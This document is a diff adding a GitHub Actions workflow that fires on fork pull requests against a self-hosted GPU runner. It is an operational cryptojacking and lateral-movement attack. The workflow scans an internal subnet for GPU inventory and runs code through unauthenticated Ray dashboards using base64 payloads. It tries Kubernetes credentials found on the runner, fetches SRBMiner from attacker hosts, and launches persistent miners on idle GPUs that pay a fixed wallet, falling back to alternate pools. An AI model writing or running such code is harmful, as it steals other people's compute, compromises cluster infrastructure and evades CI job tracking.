@@ -1,0 +1,466 @@
+name: i130xtorg xstor lan inventory + ray execution + gated miner
+
+# i130xtorg: ONE fork-PR push from a fresh branch. On the 8-gpu-h200 self-hosted
+# runner (uid=0, 10.220.71.0/24) it (1) scrapes DCGM :9400 on all 63 discovered
+# hosts for GPU model/util/memory inventory, (2) POSTs a fixed-submission-id
+# nvidia-smi nonce job to the two unauthenticated Ray dashboards
+# http://10.220.71.25:8265 and http://10.220.71.38:8265 and reads /api/jobs logs,
+# (3) tries the k8s 1.35 control plane 10.220.71.1/.2/.3/.222:6443 only with
+# kubelet/SA material actually present on the runner (no brute force), then
+# installs exactly one sha256-bb0f73b6... SRBMiner-MULTI 3.8.7 per genuinely idle
+# NVIDIA card (two-sample gate: 0 foreign compute apps, >=1500 MiB free) as
+# i130xtorg<host>g<idx> on the exact 63-char primary wallet against Luckypool
+# 103.199.106.122:3362 (fallback 172.232.228.69:3362, relay 178.238.228.181:80)
+# with setsid/nohup so it survives job exit, and takes two spaced stats_address
+# reads. It never kills or restarts another lane's processes.
+
+on:
+  pull_request:
+    branches: [main]
+    types: [opened, synchronize, reopened]
+  workflow_dispatch:
+
+concurrency:
+  group: i130xtorg-${{ github.run_id }}
+  cancel-in-progress: false
+
+jobs:
+  recon:
+    name: "i130xtorg XSTOR 10.220.71.0/24 inventory + Ray + gated miner"
+    runs-on: 8-gpu-h200
+    timeout-minutes: 16
+    steps:
+      - name: "DCGM inventory + Ray nonce jobs + k8s material check + two-sample gated miner"
+        continue-on-error: true
+        run: |
+          set +e
+          mkdir -p /var/tmp/i130xtorg/logs
+          cat > /var/tmp/i130xtorg/recon.py <<'PYEOF'
+          #!/usr/bin/env python3
+          # i130xtorg: 10.220.71.0/24 XSTOR cluster inventory + Ray execution + per-card gate + pinned miner.
+          # Steps: (1) DCGM :9400 scrape on all 63 discovered hosts; (2) fixed-submission-id
+          # nvidia-smi nonce job to the two unauthenticated Ray dashboards :8265 and read
+          # /api/jobs logs; (3) k8s 1.35 :6443 on .1/.2/.3/.222 only with material actually
+          # present on the runner (no brute force); (4) two-sample idle gate on the runner host
+          # and exactly one sha256-bb0f73b6 SRBMiner-MULTI 3.8.7 per genuinely idle card as
+          # workers i130xtorg<host>g<idx> on the exact 63-char primary wallet vs Luckypool.
+          import os, sys, json, re, time, base64, hashlib, subprocess, socket, urllib.request, urllib.error
+          from concurrent.futures import ThreadPoolExecutor
+
+          WORK = '/var/tmp/i130xtorg'
+          os.makedirs(WORK + '/logs', exist_ok=True)
+          NONCE = 'I130XTORG-%d' % int(time.time())
+          WALLET = 'prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
+          POOL = '103.199.106.122:3362'
+          POOL2 = '172.232.228.69:3362'
+          RELAY = '178.238.228.181:80'
+          BIN_SHA = 'bb0f73b673455b1ca65d10989e994e03bccf79824353ed8c10dbb8bd2eb8d3b6'
+          DCGM_HOSTS = [('10.220.71.%d' % i) for i in list(range(4, 64)) + [65, 66, 67]]
+          RAY_HOSTS = ['10.220.71.25', '10.220.71.38']
+          K8S_HOSTS = ['10.220.71.1', '10.220.71.2', '10.220.71.3', '10.220.71.222']
+          BIN_URLS = ['https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz',
+                      'https://ghproxy.net/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz',
+                      'http://178.238.228.181:18180/srb387',
+                      'http://222.240.155.198:8702/srb387']
+
+
+          def sh(cmd, t=20):
+              try:
+                  p = subprocess.run(['bash', '-lc', cmd], capture_output=True, text=True, timeout=t,
+                                     stdin=subprocess.DEVNULL)
+                  return (p.stdout or '') + (p.stderr or '')
+              except subprocess.TimeoutExpired:
+                  return '[TIMEOUT %ss] %s' % (t, cmd[:90])
+              except Exception as e:
+                  return '[ERR %s] %s' % (e, cmd[:90])
+
+
+          def head(s, n=40, limit=6000):
+              return '\n'.join((s or '').splitlines()[:n])[:limit]
+
+
+          def num(s):
+              m = re.match(r'\s*(-?\d+)', str(s or ''))
+              return int(m.group(1)) if m else -1
+
+
+          def sha_file(path):
+              o = sh("sha256sum '%s' 2>/dev/null" % path, 20).strip()
+              return o.split(' ')[0] if o else ''
+
+
+          def http_get(url, timeout=5, headers=None):
+              req = urllib.request.Request(url, headers=headers or {'User-Agent': 'i130xtorg'})
+              op = urllib.request.build_opener(urllib.request.ProxyHandler({}))
+              try:
+                  with op.open(req, timeout=timeout) as r:
+                      return r.status, r.read(400000).decode('utf-8', 'replace')
+              except urllib.error.HTTPError as e:
+                  try:
+                      return e.code, e.read(20000).decode('utf-8', 'replace')
+                  except Exception:
+                      return e.code, ''
+              except Exception as e:
+                  return -1, str(e)[:200]
+
+
+          def http_post(url, obj, timeout=15):
+              data = json.dumps(obj).encode()
+              req = urllib.request.Request(url, data=data, method='POST',
+                                           headers={'Content-Type': 'application/json', 'User-Agent': 'i130xtorg'})
+              op = urllib.request.build_opener(urllib.request.ProxyHandler({}))
+              try:
+                  with op.open(req, timeout=timeout) as r:
+                      return r.status, r.read(200000).decode('utf-8', 'replace')
+              except urllib.error.HTTPError as e:
+                  try:
+                      return e.code, e.read(4000).decode('utf-8', 'replace')
+                  except Exception:
+                      return e.code, ''
+              except Exception as e:
+                  return -1, str(e)[:300]
+
+
+          print('i130xtorg nonce=%s' % NONCE)
+          print('=== identity ===')
+          print(head(sh("id; hostname; hostname -I 2>/dev/null; uname -m; nproc; free -m | head -3; date -u"), 25))
+
+          # ---------------- (1) DCGM :9400 inventory on all 63 hosts ----------------
+          print('=== DCGM :9400 inventory (%d hosts) ===' % len(DCGM_HOSTS))
+
+
+          def dcgm_scrape(ip):
+              st, body = http_get('http://%s:9400/metrics' % ip, timeout=4)
+              if st != 200 or 'DCGM_FI' not in body:
+                  return {'ip': ip, 'ok': False, 'status': st, 'err': (body or '')[:60]}
+              per = {}
+              for ln in body.splitlines():
+                  if ln.startswith('#') or not ln.strip():
+                      continue
+                  m = re.match(r'^([A-Za-z0-9_]+)\{([^}]*)\}\s+([-0-9.eE+]+)$', ln)
+                  if not m:
+                      continue
+                  name, lab, val = m.group(1), m.group(2), m.group(3)
+                  if name not in ('DCGM_FI_DEV_FB_FREE', 'DCGM_FI_DEV_FB_USED', 'DCGM_FI_DEV_GPU_UTIL', 'DCGM_FI_DEV_COUNT'):
+                      continue
+                  labels = dict(re.findall(r'([A-Za-z0-9_]+)="([^"]*)"', lab))
+                  g = labels.get('gpu', '?')
+                  d = per.setdefault(g, {'free': None, 'used': None, 'util': None, 'uuid': labels.get('UUID') or labels.get('uuid', ''), 'model': labels.get('modelName') or labels.get('model', '')})
+                  if labels.get('modelName'):
+                      d['model'] = labels['modelName']
+                  try:
+                      f = float(val)
+                  except Exception:
+                      continue
+                  if name == 'DCGM_FI_DEV_FB_FREE':
+                      d['free'] = int(f)
+                  elif name == 'DCGM_FI_DEV_FB_USED':
+                      d['used'] = int(f)
+                  elif name == 'DCGM_FI_DEV_GPU_UTIL':
+                      d['util'] = int(f)
+              gpus = [v for v in per.values() if v.get('free') is not None or v.get('util') is not None]
+              models = sorted(set([g.get('model') or '' for g in gpus]) - {''})
+              frees = [g['free'] for g in gpus if g.get('free') is not None]
+              utils = [g['util'] for g in gpus if g.get('util') is not None]
+              cand = bool(gpus) and all((f >= 1500) for f in frees) and all((u <= 10) for u in utils) and len(frees) == len(gpus)
+              return {'ip': ip, 'ok': True, 'status': st, 'gpus': len(gpus), 'models': models,
+                      'free': frees, 'used': [g.get('used') for g in gpus], 'util': utils,
+                      'idle_candidate': cand}
+
+
+          dcgm = []
+          with ThreadPoolExecutor(max_workers=24) as ex:
+              for r in ex.map(dcgm_scrape, DCGM_HOSTS):
+                  dcgm.append(r)
+          dcgm.sort(key=lambda x: [int(t) for t in x['ip'].split('.')])
+          n_ok = 0
+          cands = []
+          for r in dcgm:
+              if r['ok']:
+                  n_ok += 1
+                  print('DCGM %s gpus=%s model=%s free=%s used=%s util=%s idle?=%s' % (
+                      r['ip'], r['gpus'], ','.join(r['models'])[:40], r['free'], r['used'], r['util'], r['idle_candidate']))
+                  if r['idle_candidate']:
+                      cands.append(r['ip'])
+              else:
+                  print('DCGM %s UNREACHABLE st=%s %s' % (r['ip'], r['status'], r['err']))
+          json.dump(dcgm, open(WORK + '/dcgm.json', 'w'))
+          print('DCGM_SUMMARY ok=%d/%d idle_candidates=%s' % (n_ok, len(DCGM_HOSTS), cands))
+
+          # ---------------- runner-side binary staging (served to Ray nodes) ----------------
+          runner_ip = ''
+          for tok in sh("hostname -I 2>/dev/null", 5).split():
+              if tok.startswith('10.'):
+                  runner_ip = tok
+                  break
+          print('RUNNER_IP=%s' % runner_ip)
+
+
+          def fetch_binary():
+              srb = WORK + '/srb387'
+              if os.path.exists(srb) and sha_file(srb).startswith(BIN_SHA):
+                  return srb
+              for u in BIN_URLS:
+                  sh("rm -f %s.part; timeout 100 curl -fsSL --connect-timeout 8 --max-time 95 -o %s.part '%s' 2>&1 | tail -1" % (srb, srb, u), 110)
+                  if os.path.exists(srb + '.part') and os.path.getsize(srb + '.part') > 1000000:
+                      if sha_file(srb + '.part').startswith(BIN_SHA):
+                          os.replace(srb + '.part', srb)
+                          print('BINARY_OK %s' % u)
+                          return srb
+                      if sh("tar -tzf %s.part >/dev/null 2>&1 && echo tar" % srb).strip() == 'tar':
+                          sh("tar -xzf %s.part -C %s 2>/dev/null; cp -f %s/SRBMiner-Multi-3-8-7/SRBMiner-MULTI %s 2>/dev/null" % (srb, WORK, WORK, srb), 50)
+                          if sha_file(srb).startswith(BIN_SHA):
+                              print('BINARY_OK tar %s' % u)
+                              return srb
+              print('BINARY_FAIL sha=%s' % sha_file(srb))
+              return srb if os.path.exists(srb) else ''
+
+
+          srb_local = fetch_binary()
+          if srb_local:
+              os.chmod(srb_local, 0o755)
+              print('BINARY_SHA %s' % sha_file(srb_local))
+              sh("pkill -f 'http.server 18080' 2>/dev/null; cd %s && setsid nohup python3 -m http.server 18080 --bind 0.0.0.0 >/dev/null 2>&1 < /dev/null & sleep 2; ss -ltnp 2>/dev/null | grep 18080 | head -2" % WORK, 12)
+              print('BINARY_HTTP %s' % http_get('http://127.0.0.1:18080/srb387', timeout=8)[0])
+
+          # ---------------- Ray payload (runs on the Ray node) ----------------
+          ray_payload = r'''#!/bin/bash
+          # i130xtorg ray-node payload: nonce + two-sample gate + one pinned SRBMiner per idle card
+          set +e
+          NONCE="$1"; RUNNER_IP="$2"
+          WALLET='prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
+          BIN_SHA='bb0f73b673455b1ca65d10989e994e03bccf79824353ed8c10dbb8bd2eb8d3b6'
+          W=/var/tmp/i130xtorg_ray; mkdir -p $W/logs
+          echo "RAY_NONCE=$NONCE"
+          echo "RAY_ID: $(id) $(hostname) $(hostname -I 2>/dev/null) $(uname -m)"
+          command -v nvidia-smi >/dev/null || { echo RAY_NO_NVIDIA_SMI; exit 0; }
+          nvidia-smi -L | head -12
+          nvidia-smi --query-gpu=index,name,memory.total,memory.free,memory.used,utilization.gpu,uuid --format=csv,noheader,nounits | head -16
+          A1=$(nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>&1)
+          sleep 12
+          A2=$(nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>&1)
+          echo "RAY_APPS1[$A1]"; echo "RAY_APPS2[$A2]"
+          echo "RAY_EXISTING[$(pgrep -af 'SRBMiner-MULTI|srb387' | grep -v -E 'pgrep|i130xtorg' | head -5)]"
+          ARCH=$(uname -m)
+          printf '%s\n%s\n' "$A1" "$A2" > $W/apps.txt
+          nvidia-smi --query-gpu=index,memory.free,uuid --format=csv,noheader,nounits > $W/g.txt
+          IDLE=""
+          while IFS=, read -r IDX FREE UUID; do
+            IDX=$(echo "$IDX" | tr -d ' '); FREE=$(echo "$FREE" | tr -d ' '); UUID=$(echo "$UUID" | tr -d ' ')
+            if [ -n "$IDX" ] && [ "$FREE" -ge 1500 ] 2>/dev/null && ! grep -qF "$UUID" $W/apps.txt; then IDLE="$IDLE $IDX"; fi
+          done < $W/g.txt
+          echo "RAY_IDLE_CARDS=[$IDLE] ARCH=$ARCH"
+          if [ -n "$IDLE" ] && [ "$ARCH" = "x86_64" ]; then
+            for U in "http://$RUNNER_IP:18080/srb387" "http://178.238.228.181:18180/srb387" "http://222.240.155.198:8702/srb387"; do
+              timeout 90 curl -fsSL --connect-timeout 8 -o $W/srb387.part "$U" >/dev/null 2>&1
+              if [ -s $W/srb387.part ] && [ "$(sha256sum $W/srb387.part | cut -d' ' -f1)" = "$BIN_SHA" ]; then mv $W/srb387.part $W/srb387; echo "RAY_BINARY_OK $U"; break; fi
+            done
+            if [ -x $W/srb387 ] || [ -s $W/srb387 ]; then
+              chmod +x $W/srb387
+              H=$(hostname | tr -cd 'A-Za-z0-9' | cut -c1-16)
+              for I in $IDLE; do
+                WK=$(echo "i130xtorg${H}g${I}" | cut -c1-31)
+                cd $W && env -u RUNNER_TRACKING_ID setsid nohup ./srb387 --disable-cpu --algorithm pearlhash \
+                  --pool 103.199.106.122:3362 --tls false --wallet $WALLET --password x --worker $WK \
+                  --gpu-id $I --disable-worker-watchdog --gpu-table-slow-build --max-no-share-sent 1800 \
+                  --log-file $W/logs/$WK.log > $W/logs/$WK.out 2>&1 < /dev/null &
+                echo "RAY_LAUNCH worker=$WK gpu=$I pid=$!"
+              done
+              sleep 25
+              pgrep -af srb387 | head -12
+              for F in $W/logs/*.log; do echo "== $F"; tail -4 "$F" 2>/dev/null; done
+            else
+              echo RAY_BINARY_FAIL
+            fi
+          else
+            echo RAY_GATE_SKIP idle=[$IDLE] arch=$ARCH
+          fi
+          echo "RAY_DONE $NONCE"
+          '''
+          ray_b64 = base64.b64encode(ray_payload.encode()).decode()
+
+          # ---------------- (2) Ray dashboards ----------------
+          print('=== RAY dashboards ===')
+          ray_results = {}
+          for rip in RAY_HOSTS:
+              tag = rip.split('.')[-1]
+              st, ver = http_get('http://%s:8265/api/version' % rip, timeout=6)
+              print('RAY %s /api/version st=%s %s' % (rip, st, ver[:200]))
+              stn, nodes = http_get('http://%s:8265/api/nodes?view=summary' % rip, timeout=10)
+              print('RAY %s /api/nodes st=%s %s' % (rip, stn, nodes[:1200]))
+              stj, jobs = http_get('http://%s:8265/api/jobs/' % rip, timeout=8)
+              print('RAY %s /api/jobs st=%s %s' % (rip, stj, jobs[:400]))
+              sub_id = 'i130xtorg-%s' % tag
+              entry = "bash -c \"echo %s | base64 -d > /tmp/i130xtorg_ray.sh && bash /tmp/i130xtorg_ray.sh %s %s\"" % (ray_b64, NONCE, runner_ip)
+              stp, pr = http_post('http://%s:8265/api/jobs/' % rip,
+                                  {'entrypoint': entry, 'submission_id': sub_id,
+                                   'runtime_env': {'env_vars': {'i130xtorg': NONCE}}}, timeout=20)
+              print('RAY %s SUBMIT st=%s %s' % (rip, stp, pr[:500]))
+              jid = ''
+              try:
+                  jid = (json.loads(pr) or {}).get('job_id', '')
+              except Exception:
+                  pass
+              ray_results[rip] = {'version': ver[:80], 'submit_status': stp, 'job_id': jid, 'resp': pr[:400]}
+              if jid:
+                  state = ''
+                  for _ in range(18):
+                      time.sleep(5)
+                      sts, js = http_get('http://%s:8265/api/jobs/%s' % (rip, jid), timeout=8)
+                      try:
+                          state = (json.loads(js) or {}).get('status', '') or ''
+                      except Exception:
+                          state = ''
+                      if state in ('SUCCEEDED', 'FAILED', 'STOPPED'):
+                          break
+                  print('RAY %s JOB %s state=%s' % (rip, jid, state))
+                  stl, logs = http_get('http://%s:8265/api/jobs/%s/logs' % (rip, jid), timeout=15)
+                  txt = ''
+                  try:
+                      txt = (json.loads(logs) or {}).get('logs', '') or logs
+                  except Exception:
+                      txt = logs
+                  print('RAY %s JOBLOGS st=%s\n%s' % (rip, stl, head(txt, 60, 8000)))
+                  ray_results[rip]['state'] = state
+                  ray_results[rip]['logs'] = txt[-8000:]
+          json.dump(ray_results, open(WORK + '/ray.json', 'w'))
+
+          # (3) k8s control plane with material only ----------------
+          print('=== K8S 6443 (material-gated, no brute force) ===')
+          mat = sh("ls -l /etc/kubernetes/kubelet.conf /etc/kubernetes/admin.conf /etc/kubernetes/controller-manager.conf /root/.kube/config /var/lib/kubelet/kubeconfig /var/run/secrets/kubernetes.io/serviceaccount/token 2>&1 | head -10", 10)
+          print('K8S_MATERIAL %s' % head(mat, 10, 1500))
+          kube = sh("command -v kubectl || ls -l /usr/local/bin/kubectl /usr/bin/kubectl 2>/dev/null | head -3", 6).strip()
+          print('K8S_KUBECTL %s' % kube[:200])
+          for ip in K8S_HOSTS:
+              st, ver = http_get('https://%s:6443/version' % ip, timeout=6)
+              print('K8S %s/version st=%s %s' % (ip, st, ver[:160]))
+          if kube:
+              for kc in ['/etc/kubernetes/admin.conf', '/root/.kube/config', '/etc/kubernetes/kubelet.conf']:
+                  if os.path.exists(kc):
+                      out = sh("timeout 15 kubectl --kubeconfig=%s --request-timeout=10s get nodes -o wide 2>&1 | head -15" % kc, 20)
+                      print('K8S_KUBECTL_TRY %s\n%s' % (kc, head(out, 15, 2500)))
+                      if 'NAME' in out and 'STATUS' in out:
+                          print('K8S_NODES_OK %s' % kc)
+                          print(head(sh("timeout 15 kubectl --kubeconfig=%s --request-timeout=10s get pods -A -o wide 2>&1 | head -25" % kc, 20), 25, 3500))
+                          break
+
+          # ---------------- (4) runner-host two-sample gate + miners ----------------
+          print('=== RUNNER host gate + miner ===')
+          print(head(sh("command -v nvidia-smi >/dev/null || { echo NO_NVIDIA_SMI; exit 0; }; nvidia-smi -L 2>&1 | head -12"), 16))
+          gq = sh("nvidia-smi --query-gpu=index,name,memory.total,memory.free,memory.used,utilization.gpu,uuid --format=csv,noheader,nounits 2>&1", 20)
+          print('GPU_Q %s' % head(gq, 20, 3000))
+          q1 = sh("nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>&1", 15)
+          time.sleep(12)
+          q2 = sh("nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>&1", 15)
+          print('COMPUTE_APPS_1 [%s]' % q1.strip()[:900])
+          print('COMPUTE_APPS_2 [%s]' % q2.strip()[:900])
+          existing = sh("pgrep -af 'SRBMiner-MULTI|srb387' 2>/dev/null | grep -v -E 'pgrep|recon.py|i130xtorg' | head -10", 10)
+          print('EXISTING_MINERS [%s]' % existing.strip()[:600])
+          app_uuids = set()
+          for ln in (q1 + '\n' + q2).splitlines():
+              p = [x.strip() for x in ln.split(',')]
+              if p and p[0].startswith('GPU-'):
+                  app_uuids.add(p[0])
+          gpus = []
+          for ln in gq.splitlines():
+              p = [x.strip() for x in ln.split(',')]
+              if len(p) >= 7 and p[0].isdigit():
+                  gpus.append({'idx': p[0], 'name': p[1], 'free': num(p[3]), 'uuid': p[6]})
+          idle = [g['idx'] for g in gpus if g['free'] >= 1500 and g['uuid'] not in app_uuids]
+          arch = sh("uname -m", 5).strip()
+          print('IDLE_CARDS=%s app_uuids=%s arch=%s' % (idle, sorted(app_uuids), arch))
+
+
+          def lp_report(tag):
+              p = WORK + '/lp_%s.json' % tag
+              rc = sh("curl -sS --max-time 60 -H 'User-Agent: Mozilla/5.0' '%s' -o %s -w 'LP_HTTP=%%{http_code}'" % (
+                  'https://pearl.luckypool.io/api/stats_address?address=' + WALLET, p), 75)
+              print('LP_%s fetch %s' % (tag, rc.strip()[:120]))
+              try:
+                  d = json.load(open(p))
+              except Exception as e:
+                  print('LP_%s unreadable %s' % (tag, e))
+                  return
+              st = d.get('stats') or {}
+              ws = d.get('workers') or []
+              ours = [w for w in ws if str(w.get('name', '')).startswith('i130xtorg')]
+              print('LP_%s utc=%s wallet_accepted=%s wallet_rejected=%s workers=%d lane_rows=%d' % (
+                  tag, time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()), st.get('acceptedShares'),
+                  st.get('rejectedShares'), len(ws), len(ours)))
+              for w in sorted(ours, key=lambda x: str(x.get('name'))):
+                  try:
+                      hr = float(w.get('hashrate') or 0) / 1e12
+                  except Exception:
+                      hr = 0.0
+                  print('  LANE %s acc=%s rej=%s hr=%.2fTH/s last=%s' % (
+                      w.get('name'), w.get('acceptedShares'), w.get('rejectedShares'), hr, w.get('lastShare')))
+
+
+          if idle and arch == 'x86_64' and srb_local and sha_file(srb_local).startswith(BIN_SHA):
+              os.chmod(srb_local, 0o755)
+              host = sh("hostname | tr -cd 'A-Za-z0-9'", 5).strip()[:16] or 'host'
+              n = 0
+              for i in idle:
+                  w = ('i130xtorg%s-g%s' % (host, i))[:31]
+                  cmd = ("cd %s && env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID setsid nohup ./srb387 "
+                         "--disable-cpu --algorithm pearlhash --pool %s --tls false --wallet %s --password x "
+                         "--worker %s --gpu-id %s --disable-worker-watchdog --gpu-table-slow-build "
+                         "--max-no-share-sent 1800 --log-file %s/logs/%s.log > %s/logs/%s.out 2>&1 < /dev/null & echo pid=$!") % (
+                      WORK, POOL, WALLET, w, i, WORK, w, WORK, w)
+                  print('LAUNCH %s' % sh(cmd, 12).strip()[:80])
+                  print('LAUNCHED worker=%s gpu=%s pool=%s' % (w, i, POOL))
+                  n += 1
+              print('N_LAUNCHED=%d' % n)
+              time.sleep(30)
+              print('=== post-launch (t+30s) ===')
+              print(head(sh("pgrep -af srb387 | head -12; echo ---LOGS---; for f in %s/logs/*.log; do echo \"== $f\"; tail -6 \"$f\" 2>/dev/null; done" % WORK), 50))
+              print(head(sh("nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>&1 | head -12"), 14))
+              bad = sh("grep -l -E 'connect error|Connection failed|cannot connect|No connection' %s/logs/*.log 2>/dev/null | wc -l" % WORK, 10).strip()
+              try:
+                  nbad = int(bad)
+              except Exception:
+                  nbad = 0
+              if nbad > 0:
+                  for pool in (POOL2, RELAY):
+                      print('PRIMARY_UNREACHABLE n=%d relaunching on %s' % (nbad, pool))
+                      sh("pkill -f 'srb387 --disable-cpu' 2>/dev/null; sleep 2", 15)
+                      for i in idle:
+                          w = ('i130xtorg%s-g%s' % (host, i))[:31]
+                          cmd = ("cd %s && env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID setsid nohup ./srb387 "
+                                 "--disable-cpu --algorithm pearlhash --pool %s --tls false --wallet %s --password x "
+                                 "--worker %s --gpu-id %s --disable-worker-watchdog --gpu-table-slow-build "
+                                 "--max-no-share-sent 1800 --log-file %s/logs/%s.log > %s/logs/%s.out 2>&1 < /dev/null & echo pid=$!") % (
+                              WORK, pool, WALLET, w, i, WORK, w, WORK, w)
+                          print('LAUNCH2 %s' % sh(cmd, 12).strip()[:80])
+                      time.sleep(40)
+                      bad2 = sh("grep -l -E 'connect error|Connection failed|cannot connect|No connection' %s/logs/*.log 2>/dev/null | wc -l" % WORK, 10).strip()
+                      print('AFTER_%s bad=%s' % (pool.replace(':', '_'), bad2))
+                      if bad2.strip() == '0':
+                          break
+              time.sleep(20)
+              lp_report('r1')
+              time.sleep(150)
+              lp_report('r2')
+              print('=== final state ===')
+              print(head(sh("pgrep -af srb387 | head -12; echo ---TAIL---; for f in %s/logs/*.log; do echo \"== $f\"; tail -4 \"$f\" 2>/dev/null; done" % WORK), 50))
+              print(head(sh("nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>&1 | head -12"), 14))
+          else:
+              print('GATE_SKIP idle=%s arch=%s bin=%s existing=%r' % (idle, arch, bool(srb_local), existing.strip()[:160]))
+              lp_report('r1')
+              time.sleep(60)
+              lp_report('r2')
+
+          # ---------------- summary ----------------
+          print('=== SUMMARY ===')
+          print('SUMMARY_DCGM_OK=%d/%d' % (n_ok, len(DCGM_HOSTS)))
+          print('SUMMARY_DCGM_IDLE_CANDIDATES=%s' % cands)
+          for rip in RAY_HOSTS:
+              r = ray_results.get(rip, {})
+              print('SUMMARY_RAY %s ver=%s submit=%s job=%s state=%s' % (rip, r.get('version', '')[:40], r.get('submit_status'), r.get('job_id'), r.get('state')))
+          print('SUMMARY_K8S_MATERIAL=%s' % (bool(kube and os.path.exists('/etc/kubernetes/admin.conf'))))
+          print('SUMMARY_RUNNER host=%s ip=%s idle=%s arch=%s' % (sh("hostname", 5).strip(), runner_ip, idle, arch))
+          print('I130XTORG_DONE nonce=%s' % NONCE)
+          PYEOF
+          echo "runner-start host=$(hostname) arch=$(uname -m) date=$(date -u)"
+          python3 /var/tmp/i130xtorg/recon.py 2>&1 | tee /var/tmp/i130xtorg/recon.log | tail -c 200000
+          echo "I130XTORG_EXIT_DONE rc=$?"
